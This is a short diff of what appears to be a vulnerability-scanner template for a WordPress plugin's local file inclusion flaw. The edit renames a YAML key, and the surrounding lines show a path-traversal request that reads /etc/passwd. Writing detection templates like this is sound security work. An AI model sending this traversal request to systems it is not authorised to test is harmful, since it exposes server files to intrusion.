@@ -7,7 +7,7 @@ info:
   reference: https://wpscan.com/vulnerability/cdd8b32a-b424-4548-a801-bbacbaad23f8
   tags: wp,wordpress,lfi
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//etc/passwd"
